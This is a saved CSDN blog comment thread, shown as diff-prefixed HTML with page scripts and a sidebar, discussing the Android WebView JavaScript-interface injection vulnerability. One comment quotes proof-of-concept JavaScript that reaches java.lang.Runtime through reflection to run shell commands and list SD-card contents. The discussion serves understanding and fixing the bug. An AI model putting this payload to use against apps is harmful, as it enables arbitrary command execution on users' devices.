<a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/A328240784" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_a328240784.jpg" width="40" height="40"></a></dd><dd class="comment_body"><fieldset><legend>引用“leehong2005”的评论：</legend>回复A328240784：没有明白你的意思？那段是指哪一段？</fieldset><br>var i=0;  <br>      function getContents(inputStream)  <br>      {  <br>        var contents = ""+i;  <br>        var b = inputStream.read();  <br>        var i = 1;  <br>        while(b != -1) {  <br>            var bString = String.fromCharCode(b);  <br>            contents += bString;  <br>            contents += "\n"  <br>            b = inputStream.read();  <br>        }  <br>        i=i+1;  <br>        return contents;  <br>       }  <br>        <br>       function execute(cmdArgs)  <br>       {  <br>        for (var obj in window) {  <br>            console.log(obj);  <br>            if ("getClass" in window[obj]) {  <br>                alert(obj);  <br>                return window[obj].getClass().forName("java.lang.Runtime").  <br>                    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);  <br>             }  <br>         }  <br>       }   <br>        <br>      var p = execute(["ls","/mnt/sdcard/"]);  <br>      document.write(getContents(p.getInputStream()));</dd></dl><dl class="comment_item comment_topic" id="comment_item_3242577"><dt class="comment_head" floor="3">3楼 <span class="user"><a class="username" href="http://blog.csdn.net/A328240784" target="_blank">追风筝的孩子</a> <span class="ptime">2013-12-03 17:46发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="3242577" username="A328240784"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/A328240784" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_a328240784.jpg" width="40" height="40"></a></dd><dd class="comment_body">博主你好，我还是不太懂为啥例一的获取sdcard目录下文件列表会失败，js是load页面的时候就执行的啊，跟打log无关吧</dd><dl class="comment_item comment_reply" id="comment_item_3303537"><dt class="comment_head" floor="3">Re: <span class="user"><a class="username" href="http://blog.csdn.net/leehong2005" target="_blank">leehong2005</a> <span class="ptime">2013-12-18 15:28发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="3303537" username="leehong2005"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/leehong2005" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_leehong2005.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复追风筝的孩子：例一的代码是会出错的呀。会把SDCard里面的目录列出来。</dd></dl><dl class="comment_item comment_reply" id="comment_item_3243293"><dt class="comment_head" floor="3">Re: <span class="user"><a class="username" href="http://blog.csdn.net/leehong2005" target="_blank">leehong2005</a> <span class="ptime">2013-12-03 20:54发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="3243293" username="leehong2005"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/leehong2005" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_leehong2005.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复追风筝的孩子：你那不重现吗？</dd><dl class="comment_item comment_reply" id="comment_item_3278823"><dt class="comment_head" floor="2">Re: <span class="user"><a class="username" href="http://blog.csdn.net/A328240784" target="_blank">追风筝的孩子</a> <span class="ptime">2013-12-11 22:19发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="3278823" username="A328240784"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/A328240784" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_a328240784.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复leehong2005：代码没问题,但有些地方不理解..我的意思是js不是会自动加载的吗,为什么不会执行那段getclass的代码</dd><dl class="comment_item comment_reply" id="comment_item_3279023"><dt class="comment_head" floor="1">Re: <span class="user"><a class="username" href="http://blog.csdn.net/leehong2005" target="_blank">leehong2005</a> <span class="ptime">2013-12-12 00:00发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="3279023" username="leehong2005"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/leehong2005" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_leehong2005.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复追风筝的孩子：没有明白你的意思？那段是指哪一段？</dd></dl></dl></dl></dl><dl class="comment_item comment_topic" id="comment_item_2969365"><dt class="comment_head" floor="2">2楼 <span class="user"><a class="username" href="http://blog.csdn.net/seker_xinjian" target="_blank">seker_xinjian</a> <span class="ptime">2013-10-10 08:54发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="2969365" username="seker_xinjian"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/seker_xinjian" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_seker_xinjian.jpg" width="40" height="40"></a></dd><dd class="comment_body">写的很不错。<br>高端，大气，上档次！</dd><dl class="comment_item comment_reply" id="comment_item_2970199"><dt class="comment_head" floor="2">Re: <span class="user"><a class="username" href="http://blog.csdn.net/leehong2005" target="_blank">leehong2005</a> <span class="ptime">2013-10-10 13:26发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="2970199" username="leehong2005"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/leehong2005" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_leehong2005.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复seker_xinjian：把别人搞出来的东西，自己再研究学习一下而已。</dd></dl></dl><dl class="comment_item comment_topic" id="comment_item_2967423"><dt class="comment_head" floor="1">1楼 <span class="user"><a class="username" href="http://blog.csdn.net/woyaowenzi" target="_blank">woyaowenzi</a> <span class="ptime">2013-10-09 13:27发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="2967423" username="woyaowenzi"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/woyaowenzi" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_woyaowenzi.jpg" width="40" height="40"></a></dd><dd class="comment_body">好东西，mark</dd><dl class="comment_item comment_reply" id="comment_item_2968089"><dt class="comment_head" floor="1">Re: <span class="user"><a class="username" href="http://blog.csdn.net/leehong2005" target="_blank">leehong2005</a> <span class="ptime">2013-10-09 16:43发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="2968089" username="leehong2005"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/leehong2005" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_leehong2005.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复woyaowenzi：这个问题相当的经典。一般的应用估计都不会修复它。但如果应用用户太大，不得不修复，不然就是千夫所指呀。</dd><dl class="comment_item comment_reply" id="comment_item_2969169"><dt class="comment_head" floor="1">Re: <span class="user"><a class="username" href="http://blog.csdn.net/woyaowenzi" target="_blank">woyaowenzi</a> <span class="ptime">2013-10-09 23:14发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="2969169" username="woyaowenzi"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/woyaowenzi" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_woyaowenzi.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复leehong2005：貌似我们这边已修复了，不过我没注意细节。之前这个问题是你修复的吗？</dd><dl class="comment_item comment_reply" id="comment_item_2970195"><dt class="comment_head" floor="1">Re: <span class="user"><a class="username" href="http://blog.csdn.net/leehong2005" target="_blank">leehong2005</a> <span class="ptime">2013-10-10 13:25发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="2970195" username="leehong2005"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/leehong2005" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_leehong2005.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复woyaowenzi：不是我修复的。是我们团队的架构师他们讨论出来的，我只是学习研究了一下。所以都不好意思拿出来</dd><dl class="comment_item comment_reply" id="comment_item_2974089" style="margin-left:0;"><dt class="comment_head" floor="1">Re: <span class="user"><a class="username" href="http://blog.csdn.net/woyaowenzi" target="_blank">woyaowenzi</a> <span class="ptime">2013-10-11 17:51发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="2974089" username="woyaowenzi"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/woyaowenzi" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_woyaowenzi.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复leehong2005：这个没关系，学会了，就是自己的。我一向是拿来主义。嘎嘎。</dd></dl></dl></dl></dl></dl><div class="clear"></div></div>
+    <div id="comment_bar" style="display: none;">
+    </div>
+    <div id="comment_form"><div class="guest_link">您还没有登录,请<a href="javascript:void(0);" onclick="javascript:loginbox();">[登录]</a>或<a href="http://passport.csdn.net/account/register?from=http%3A%2F%2Fblog.csdn.net%2Fleehong2005%2Farticle%2Fdetails%2F11808557">[注册]</a></div></div>
+    <div class="announce">
+        * 以上用户言论只代表其个人观点，不代表CSDN网站的观点或立场<a name="reply"></a><a name="quote"></a></div>
+</div>
+
+<script type="text/javascript">
+    var fileName = '11808557';
+    var commentscount = 31;
+    var islock = false
+</script>
+<script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/comment.js"></script>
+    <div id="ad_bot">
+    </div>
+<div id="report_dialog">
+</div>
+
+<div id="d-top" style="bottom:60px;">
+        <a id="quick-reply" class="btn btn-top q-reply" title="快速回复" style="display:none;">
+            <img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/blog-icon-reply.png" alt="快速回复">
+        </a>    
+
+    <a id="d-top-a" class="btn btn-top backtop" style="display: none;" title="返回顶部" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_huidaodingbu&#39;])">         
+         <img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/top.png" alt="TOP">
+    </a>
+</div>
+<script type="text/javascript">
+    $(function ()
+    {
+        $("#ad_frm_0").height("90px");
+        
+        setTimeout(function(){
+            $("#ad_frm_2").height("200px");
+        },1000);    
+    });
+  
+</script>
+<style type="text/css">
+    .tag_list
+    {
+        background: none repeat scroll 0 0 #FFFFFF;
+        border: 1px solid #D7CBC1;
+        color: #000000;
+        font-size: 12px;
+        line-height: 20px;
+        list-style: none outside none;
+        margin: 10px 2% 0 1%;
+        padding: 1px;
+    }
+    .tag_list h5
+    {
+        background: none repeat scroll 0 0 #E0DBD3;
+        color: #47381C;
+        font-size: 12px;
+        height: 24px;
+        line-height: 24px;
+        padding: 0 5px;
+        margin: 0;
+    }
+    .tag_list h5 a
+    {
+        color: #47381C;
+    }
+    .classify
+    {
+        margin: 10px 0;
+        padding: 4px 12px 8px;
+    }
+    .classify a
+    {
+        margin-right: 20px;
+        white-space: nowrap;
+    }
+</style>
+
+
+<div class="tag_list" style="">
+
+    <h5>
+        <a href="http://www.csdn.net/tag/" target="_blank">核心技术类目</a></h5>
+    <div class="classify">
+<a title="全部主题" href="http://www.csdn.net/tag" target="_blank" onclick="LogClickCount(this,336);">全部主题</a>
+<a title="Hadoop" href="http://g.csdn.net/5272865" target="_blank" onclick="LogClickCount(this,336);">Hadoop</a>
+<a title="AWS" href="http://g.csdn.net/5272866" target="_blank" onclick="LogClickCount(this,336);">AWS</a>
+<a title="移动游戏" href="http://g.csdn.net/5272870" target="_blank" onclick="LogClickCount(this,336);">移动游戏</a>
+<a title="Java" href="http://g.csdn.net/5272871" target="_blank" onclick="LogClickCount(this,336);">Java</a>
+<a title="Android" href="http://g.csdn.net/5272872" target="_blank" onclick="LogClickCount(this,336);">Android</a>
+<a title="iOS" href="http://g.csdn.net/5272873" target="_blank" onclick="LogClickCount(this,336);">iOS</a>
+<a title="Swift" href="http://g.csdn.net/5272868" target="_blank" onclick="LogClickCount(this,336);">Swift</a>
+<a title="智能硬件" href="http://g.csdn.net/5272869" target="_blank" onclick="LogClickCount(this,336);">智能硬件</a>
+<a title="Docker" href="http://g.csdn.net/5272867" target="_blank" onclick="LogClickCount(this,336);">Docker</a>
+<a title="OpenStack" href="http://g.csdn.net/5272925" target="_blank" onclick="LogClickCount(this,336);">OpenStack</a>
+<a title="VPN" href="http://www.csdn.net/tag/vpn" target="_blank" onclick="LogClickCount(this,336);">VPN</a>
+<a title="Spark" href="http://g.csdn.net/5272924" target="_blank" onclick="LogClickCount(this,336);">Spark</a>
+<a title="ERP" href="http://www.csdn.net/tag/erp" target="_blank" onclick="LogClickCount(this,336);">ERP</a>
+<a title="IE10" href="http://www.csdn.net/tag/ie10" target="_blank" onclick="LogClickCount(this,336);">IE10</a>
+<a title="Eclipse" href="http://www.csdn.net/tag/eclipse" target="_blank" onclick="LogClickCount(this,336);">Eclipse</a>
+<a title="CRM" href="http://www.csdn.net/tag/crm" target="_blank" onclick="LogClickCount(this,336);">CRM</a>
+<a title="JavaScript" href="http://www.csdn.net/tag/javascript" target="_blank" onclick="LogClickCount(this,336);">JavaScript</a>
+<a title="数据库" href="http://www.csdn.net/tag/%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" onclick="LogClickCount(this,336);">数据库</a>
+<a title="Ubuntu" href="http://www.csdn.net/tag/ubuntu" target="_blank" onclick="LogClickCount(this,336);">Ubuntu</a>
+<a title="NFC" href="http://www.csdn.net/tag/nfc" target="_blank" onclick="LogClickCount(this,336);">NFC</a>
+<a title="WAP" href="http://www.csdn.net/tag/wap" target="_blank" onclick="LogClickCount(this,336);">WAP</a>
+<a title="jQuery" href="http://www.csdn.net/tag/jquery" target="_blank" onclick="LogClickCount(this,336);">jQuery</a>
+<a title="BI" href="http://www.csdn.net/tag/bi" target="_blank" onclick="LogClickCount(this,336);">BI</a>
+<a title="HTML5" href="http://www.csdn.net/tag/html5" target="_blank" onclick="LogClickCount(this,336);">HTML5</a>
+<a title="Spring" href="http://www.csdn.net/tag/spring" target="_blank" onclick="LogClickCount(this,336);">Spring</a>
+<a title="Apache" href="http://www.csdn.net/tag/apache" target="_blank" onclick="LogClickCount(this,336);">Apache</a>
+<a title=".NET" href="http://www.csdn.net/tag/.net" target="_blank" onclick="LogClickCount(this,336);">.NET</a>
+<a title="API" href="http://www.csdn.net/tag/api" target="_blank" onclick="LogClickCount(this,336);">API</a>
+<a title="HTML" href="http://www.csdn.net/tag/html" target="_blank" onclick="LogClickCount(this,336);">HTML</a>
+<a title="SDK" href="http://www.csdn.net/tag/sdk" target="_blank" onclick="LogClickCount(this,336);">SDK</a>
+<a title="IIS" href="http://www.csdn.net/tag/iis" target="_blank" onclick="LogClickCount(this,336);">IIS</a>
+<a title="Fedora" href="http://www.csdn.net/tag/fedora" target="_blank" onclick="LogClickCount(this,336);">Fedora</a>
+<a title="XML" href="http://www.csdn.net/tag/xml" target="_blank" onclick="LogClickCount(this,336);">XML</a>
+<a title="LBS" href="http://www.csdn.net/tag/lbs" target="_blank" onclick="LogClickCount(this,336);">LBS</a>
+<a title="Unity" href="http://www.csdn.net/tag/unity" target="_blank" onclick="LogClickCount(this,336);">Unity</a>
+<a title="Splashtop" href="http://www.csdn.net/tag/splashtop" target="_blank" onclick="LogClickCount(this,336);">Splashtop</a>
+<a title="UML" href="http://www.csdn.net/tag/uml" target="_blank" onclick="LogClickCount(this,336);">UML</a>
+<a title="components" href="http://www.csdn.net/tag/components" target="_blank" onclick="LogClickCount(this,336);">components</a>
+<a title="Windows Mobile" href="http://www.csdn.net/tag/windowsmobile" target="_blank" onclick="LogClickCount(this,336);">Windows Mobile</a>
+<a title="Rails" href="http://www.csdn.net/tag/rails" target="_blank" onclick="LogClickCount(this,336);">Rails</a>
+<a title="QEMU" href="http://www.csdn.net/tag/qemu" target="_blank" onclick="LogClickCount(this,336);">QEMU</a>
+<a title="KDE" href="http://www.csdn.net/tag/kde" target="_blank" onclick="LogClickCount(this,336);">KDE</a>
+<a title="Cassandra" href="http://www.csdn.net/tag/cassandra" target="_blank" onclick="LogClickCount(this,336);">Cassandra</a>
+<a title="CloudStack" href="http://www.csdn.net/tag/cloudstack" target="_blank" onclick="LogClickCount(this,336);">CloudStack</a>
+<a title="FTC" href="http://www.csdn.net/tag/ftc" target="_blank" onclick="LogClickCount(this,336);">FTC</a>
+<a title="coremail" href="http://www.csdn.net/tag/coremail" target="_blank" onclick="LogClickCount(this,336);">coremail</a>
+<a title="OPhone " href="http://www.csdn.net/tag/ophone" target="_blank" onclick="LogClickCount(this,336);">OPhone </a>
+<a title="CouchBase" href="http://www.csdn.net/tag/couchbase" target="_blank" onclick="LogClickCount(this,336);">CouchBase</a>
+<a title="云计算" href="http://www.csdn.net/tag/%E4%BA%91%E8%AE%A1%E7%AE%97" target="_blank" onclick="LogClickCount(this,336);">云计算</a>
+<a title="iOS6" href="http://www.csdn.net/tag/iOS6" target="_blank" onclick="LogClickCount(this,336);">iOS6</a>
+<a title="Rackspace " href="http://www.csdn.net/tag/rackspace" target="_blank" onclick="LogClickCount(this,336);">Rackspace </a>
+<a title="Web App" href="http://www.csdn.net/tag/webapp" target="_blank" onclick="LogClickCount(this,336);">Web App</a>
+<a title="SpringSide" href="http://www.csdn.net/tag/springside" target="_blank" onclick="LogClickCount(this,336);">SpringSide</a>
+<a title="Maemo" href="http://www.csdn.net/tag/maemo" target="_blank" onclick="LogClickCount(this,336);">Maemo</a>
+<a title="Compuware" href="http://www.csdn.net/tag/compuware" target="_blank" onclick="LogClickCount(this,336);">Compuware</a>
+<a title="大数据" href="http://www.csdn.net/tag/%E5%A4%A7%E6%95%B0%E6%8D%AE" target="_blank" onclick="LogClickCount(this,336);">大数据</a>
+<a title="aptech" href="http://www.csdn.net/tag/aptech" target="_blank" onclick="LogClickCount(this,336);">aptech</a>
+<a title="Perl" href="http://www.csdn.net/tag/perl" target="_blank" onclick="LogClickCount(this,336);">Perl</a>
+<a title="Tornado" href="http://www.csdn.net/tag/tornado" target="_blank" onclick="LogClickCount(this,336);">Tornado</a>
+<a title="Ruby" href="http://www.csdn.net/tag/ruby" target="_blank" onclick="LogClickCount(this,336);">Ruby</a>
+<a title="Hibernate" href="http://www.csdn.net/hibernate" target="_blank" onclick="LogClickCount(this,336);">Hibernate</a>
+<a title="ThinkPHP" href="http://www.csdn.net/tag/thinkphp" target="_blank" onclick="LogClickCount(this,336);">ThinkPHP</a>
+<a title="HBase" href="http://www.csdn.net/tag/hbase" target="_blank" onclick="LogClickCount(this,336);">HBase</a>
+<a title="Pure" href="http://www.csdn.net/tag/pure" target="_blank" onclick="LogClickCount(this,336);">Pure</a>
+<a title="Solr" href="http://www.csdn.net/tag/solr" target="_blank" onclick="LogClickCount(this,336);">Solr</a>
+<a title="Angular" href="http://www.csdn.net/tag/angular" target="_blank" onclick="LogClickCount(this,336);">Angular</a>
+<a title="Cloud Foundry" href="http://www.csdn.net/tag/cloudfoundry" target="_blank" onclick="LogClickCount(this,336);">Cloud Foundry</a>
+<a title="Redis" href="http://www.csdn.net/tag/redis" target="_blank" onclick="LogClickCount(this,336);">Redis</a>
+<a title="Scala" href="http://www.csdn.net/tag/scala" target="_blank" onclick="LogClickCount(this,336);">Scala</a>
+<a title="Django" href="http://www.csdn.net/tag/django" target="_blank" onclick="LogClickCount(this,336);">Django</a>
+<a title="Bootstrap" href="http://www.csdn.net/tag/bootstrap" target="_blank" onclick="LogClickCount(this,336);">Bootstrap</a>
+    </div>
+
+</div>
+  <script language="javascript" type="text/javascript">     
+      $(function(){
+              setTimeout(function(){
+                  $.get("/leehong2005/svc/GetTagContent",function(data){
+                      $(".tag_list").html(data).show();
+                  });     
+              });
+          },500);                       
+ </script> 
+
+
+<div id="pop_win" style="display:none ;position: absolute; z-index: 10000; border: 1px solid rgb(220, 220, 220); top: 222.5px; left: 630px; opacity: 1; background: none 0px 0px repeat scroll rgb(255, 255, 255);">
+    
+</div>
+<div id="popup_mask"></div>
+<style>
+    #popup_mask
+    {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        background: #000;
+        z-index: 9999;
+        left: 0px;
+        top: 0px;
+        opacity: 0.3;
+        filter: alpha(opacity=30);
+        display: none;
+    }
+
+</style>
+
+
+
+
+<script type="text/javascript">
+    $(function(){
+        setTimeout(function(){
+            $(".comment_body:contains('回复')").each(function(index,item){
+                var u=$(this).text().split('：')[0].toString().replace("回复","")
+                var thisComment=$(this);
+                if(u)
+                {
+                    $.getJSON("https://passport.csdn.net/get/nick?callback=?", {users: u}, function(a) {
+                        if(a!=null&&a.data!=null&&a.data.length>0)
+                        {
+                            nick=a.data[0].n; 
+                            if(u!=nick)
+                            {
+                                thisComment.text(thisComment.text().replace(u,nick));  
+                            }
+                        }       
+                    });  
+                }
+            });         
+
+        },200);  
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },5000);
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },10000);
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },15000);
+        
+        setTimeout(function(){
+            $("a img[src='http://js.tongji.linezing.com/stats.gif']").parent().css({"position":"absolute","left":"50%"});
+        },300);
+    });
+
+    function loginbox(){
+        var $logpop=$("#pop_win");
+        $logpop.html('<iframe src="https://passport.csdn.net/account/loginbox?service=http://static.blog.csdn.net/callback.htm" frameborder="0" height="600" width="400" scrolling="no"></iframe>');
+
+        $('#popup_mask').css({
+            opacity: 0.5,
+            width: $( document ).width() + 'px',
+            height:  $( document ).height() + 'px'
+        });
+        $('#popup_mask').css("display","block");
+ 
+        $logpop.css( {
+            top: ($( window ).height() - $logpop.height())/ 2  + $( window 
+       ).scrollTop() + 'px',
+            left:($( window ).width() - $logpop.width())/ 2
+        } );
+ 
+        setTimeout( function () {
+            $logpop.show();
+            $logpop.css( {
+                opacity: 1
+            } );
+        }, 200 );
+ 
+        $('#popup_mask').unbind("click");
+        $('#popup_mask').bind("click", function(){
+            $('#popup_mask').hide();
+            var $clopop = $("#pop_win");
+            $("#common_ask_div_sc").css("display","none");
+            $clopop.css( {
+                opacity: 0
+            } );
+            setTimeout( function () {
+                $clopop.hide();
+            }, 350 );
+            return false;
+        });
+    }   
+
+</script>
+ <script language="javascript" type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/async_new.js"></script>      
+
+
+                        <div class="clear">
+                        </div>
+                    </div>                   
+                
+            </div>
+                   
+           <div id="side">
+    <div class="side">
+<div id="panel_Profile" class="panel">
+<ul class="panel_head"><span>个人资料</span></ul>
+<ul class="panel_body profile">
+<div id="blog_userface">
+    <a href="http://my.csdn.net/leehong2005" target="_blank">
+    <img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/1_leehong2005.jpg" title="访问我的空间" style="max-width:90%">
+    </a>
+    <br>
+    <span><a href="http://my.csdn.net/leehong2005" class="user_name" target="_blank">leehong2005</a></span>
+</div>
+<div class="interact">
+
+    <a href="javascript:void(0);" class="attent" id="span_add_follow" title="[加关注]"></a>
+
+ <a href="javascript:void(0);" class="letter" title="[发私信]" onclick="window.open(&#39;http://msg.csdn.net/letters/model?receiver=leehong2005&#39;,&#39;_blank&#39;,&#39;height=350,width=700&#39;);_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_sixin&#39;])"></a>  
+</div>
+<div id="blog_medal">
+                <div id="bms_box">
+               </div>
+</div>
+<ul id="blog_rank">
+    <li>访问：<span>681039次</span></li>
+    <li>积分：<span>6001</span> </li>    
+    <li>等级： <span style="position:relative;display:inline-block;z-index:1">
+            <img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/blog6.png" alt="" style="vertical-align: middle;" id="leveImg">
+            <div id="smallTittle" style=" position: absolute;  left: -24px;  top: 25px;  text-align: center;  width: 101px;  height: 32px;  background-color: #fff;  line-height: 32px;  border: 2px #DDDDDD solid;  box-shadow: 0px 2px 2px rgba (0,0,0,0.1);  display: none;   z-index: 999;">
+            <div style="left: 42%;  top: -8px;  position: absolute;  width: 0;  height: 0;  border-left: 10px solid transparent;  border-right: 10px solid transparent;  border-bottom: 8px solid #EAEAEA;"></div>
+            积分：6001 </div>
+        </span>  </li>
+    <li>排名：<span>第2793名</span></li>
+</ul>
+<ul id="blog_statistics">
+    <li>原创：<span>102篇</span></li>
+    <li>转载：<span>1篇</span></li>
+    <li>译文：<span>0篇</span></li>
+    <li>评论：<span>628条</span></li>
+</ul>
+</ul>
+</div>
+
+
+<div class="panel" id="panel_Search">
+    <ul class="panel_head"><span>文章搜索</span></ul>
+    <ul class="panel_body">
+        <form id="frmSearch" action="http://so.csdn.net/search" class="form_search" target="_blank">
+        <span><input id="inputSearch" type="text" class="blogsearch" title="请输入关键字"></span>
+        <input id="btnSubmit" type="button" value="搜索" title="search in blog">
+        <input type="hidden" name="q" id="inputQ">
+        <input type="hidden" name="t" value="blog">
